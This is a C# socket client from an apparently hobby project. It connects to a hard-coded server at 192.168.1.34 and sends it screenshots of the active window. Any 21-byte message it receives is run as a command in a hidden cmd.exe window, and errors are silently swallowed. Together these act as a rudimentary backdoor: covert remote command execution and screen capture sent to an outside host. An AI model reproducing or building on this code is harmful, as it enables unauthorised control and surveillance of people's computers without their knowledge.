using NatureConsole;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Nature.Client.Comm
{
    public class SocketClient
    {
        Socket socketSend;
        public void ConnectServer()
        {
            Console.Title = "客户端";
            try
            {
                //创建负责通信的Socket
                socketSend = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //获取要建立连接的远程服务器IP与端口号
                IPAddress iPAddress = IPAddress.Parse("192.168.1.34");
                //string ip = GetLocalIp();
                //IPAddress iPAddress = IPAddress.Parse(ip);
                //IPEndPoint iPEndPoint = new IPEndPoint(iPAddress, 50000);
                IPEndPoint iPEndPoint = new IPEndPoint(iPAddress, 10001);
                socketSend.Connect(iPEndPoint);
                ShowMsg("连接服务器成功");

                //开启一个新的线程不停地接收服务端发来的消息
                Thread thread = new Thread(ReciveMsg);
                thread.IsBackground = true;
                thread.Start();
            }
            catch
            {}
            
            //Thread thread = new Thread(SendMsg);


            //for (int i = 0; i < 100; i++)
            //{
            //    //创建负责通信的Socket
            //    socketSend = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            //    //获取要建立连接的远程服务器IP与端口号
            //    IPAddress iPAddress = IPAddress.Parse("192.168.0.101");
            //    IPEndPoint iPEndPoint = new IPEndPoint(iPAddress, 50000);
            //    socketSend.Connect(iPEndPoint);
            //    ShowMsg("连接服务器成功");
            //}

        }
        void ShowMsg(string str)
        {
            Console.WriteLine(str + "\r\n");
           
        }

        //public async void SendMsg()
        public void SendMsg()
        {
            while (true)
            {
                try
                {
                    string msg = Console.ReadLine();
                    byte[] buffer = Encoding.UTF8.GetBytes(msg);

                    List<byte> list = new List<byte>();
                    list.Add(0);
                    list.AddRange(buffer);
                    byte[] newBuffer = list.ToArray();

                    socketSend.Send(newBuffer);
                    //await socketSend.SendAsync(newBuffer,SocketFlags.None);
                }
                catch
                {
                }
            }
        }
        public void SendImage()
        {
            while (true)
            {
                try
                {
                    CaptureHelpers captureHelpers = new CaptureHelpers();
                    //获取要发送图片的路径
                    string url = captureHelpers.GetActiveWindowImageUrl();
                    using (FileStream fsRead = new FileStream(url,FileMode.Open,FileAccess.Read))
                    {
                        byte[] buffer = new byte[1024 * 1024 * 3];
                        int r = fsRead.Read(buffer, 0, buffer.Length);
                        List<byte> list = new List<byte>();
                        list.Add(1);
                        list.AddRange(buffer);
                        byte[] newBuffer = list.ToArray();
                        socketSend.Send(newBuffer, 0,r+1,SocketFlags.None);
                    }
                    break;
                }
                catch
                {
                }
            }
        }

        //不停地接收服务端发来的消息
        public void ReciveMsg()
        {
            while (true)
            {
                try
                {
                    byte[] buffer = new byte[1024 * 1024];
                    int r = socketSend.Receive(buffer);
                    if (r == 0)
                    {
                        break;
                    }
                    else if (r == 21)
                    {
                        string str = Encoding.UTF8.GetString(buffer, 0, r);
                        ShowMsg(socketSend.RemoteEndPoint + ":" + str);
                        //开启一个新的进程用来跑CMD
                        Process p = new Process();
                        //设置要启动的应用程序
                        p.StartInfo.FileName = "cmd.exe";
                        //是否使用操作系统shell启动
                        p.StartInfo.UseShellExecute = false;
                        // 接受来自调用程序的输入信息
                        p.StartInfo.RedirectStandardInput = true;
                        //输出信息
                        p.StartInfo.RedirectStandardOutput = true;
                        // 输出错误
                        p.StartInfo.RedirectStandardError = true;
                        //不显示程序窗口
                        p.StartInfo.CreateNoWindow = true;
                        //启动程序
                        p.Start();

                        //向cmd窗口发送输入信息
                        p.StandardInput.WriteLine(str + "&exit");

                        p.StandardInput.AutoFlush = true;

                        //获取输出信息
                        string strOuput = p.StandardOutput.ReadToEnd();
                        //等待程序执行完退出进程
                        p.WaitForExit();
                        p.Close();
                    }
                    else
                    {
                        string str = Encoding.UTF8.GetString(buffer, 0, r);
                        ShowMsg(socketSend.RemoteEndPoint + ":" + str);
                    }
                    
                }
                catch
                {}
                
            }
        }
        //获取本地的IP地址
        public string GetLocalIp()
        {
            string AddressIP = string.Empty;
            foreach (IPAddress _IPAddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (_IPAddress.AddressFamily.ToString() == "InterNetwork")
                {
                    AddressIP = _IPAddress.ToString();
                }
            }
            return AddressIP;
        }

        #region 20190916
        /*
        Socket socketclient = null;
        //负责监听服务器端的请求
        Thread threadclient = null;

        public void StartServer(string msg)
        { 
            Connection();
            ClientSendMsg(msg);
            Console.ReadKey();
        }
        //与服务器建立连接
        public void Connection()
        {
            socketclient = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
            IPAddress address = IPAddress.Parse("127.0.0.1");

            IPEndPoint iPEndPoint = new IPEndPoint(address,8088);

            try
            {
                socketclient.Connect(iPEndPoint);
            }
            catch (Exception)
            {
                Console.WriteLine("连接失败");
                return;
            }
            threadclient = new Thread(RecvMsg);
            threadclient.IsBackground = true;
            threadclient.Start();
        }
        /// <summary>
        /// 接收服务器发来的信息
        /// </summary>
        public void RecvMsg()
        {
            int x = 0;
            //持续监听服务器端发来的消息
            while (true)
            {
                try
                {
                    //定义一个1M的内存缓冲区，用于临时性存储接收到的消息  
                    byte[] arrRecvmsg = new byte[1024 * 1024];

                    //将客户端套接字接收到的数据存入内存缓冲区，并获取长度  
                    int length = socketclient.Receive(arrRecvmsg);

                    //将套接字获取到的字符数组转换为人可以看懂的字符串  
                    string strRevMsg = Encoding.UTF8.GetString(arrRecvmsg, 0, length);
                    if (x == 1)
                    {
                        Console.WriteLine("服务器:" + GetCurrentTime() + "\r\n" + strRevMsg + "\r\n\n");
                        Console.WriteLine("服务器:" + GetCurrentTime() + "\r\n" + strRevMsg + "\r\n\n");
                    }
                    else
                    {
                        Console.WriteLine(strRevMsg + "\r\n\n");
                        Console.WriteLine(strRevMsg + "\r\n\n");
                        x = 1;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("远程服务器已经中断连接" + "\r\n\n");
                    Console.WriteLine("远程服务器已经中断连接" + "\r\n");
                    break;
                }
            }
        }
        //获取当前系统时间  
        public DateTime GetCurrentTime()
        {
            DateTime currentTime = new DateTime();
            currentTime = DateTime.Now;
            return currentTime;
        }
        //发送字符信息到服务端的方法  
        public void ClientSendMsg(string sendMsg)
        {
            //将输入的内容字符串转换为机器可以识别的字节数组     
            byte[] arrClientSendMsg = Encoding.UTF8.GetBytes(sendMsg);
            //调用客户端套接字发送字节数组     
            socketclient.Send(arrClientSendMsg);
        }
        */
        #endregion
    }  
}
